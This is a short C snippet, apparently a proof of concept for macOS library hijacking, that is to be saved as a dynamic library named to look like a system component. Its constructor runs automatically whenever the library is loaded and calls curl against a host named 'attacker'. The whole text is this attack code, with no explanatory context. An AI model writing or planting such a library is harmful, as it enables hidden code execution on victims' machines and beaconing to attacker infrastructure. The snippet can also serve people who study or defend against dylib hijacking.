// Save as libSystemProxy.dylib
#include <stdio.h>
__attribute__((constructor)) void init() {
    system("curl http://attacker/ping");
}
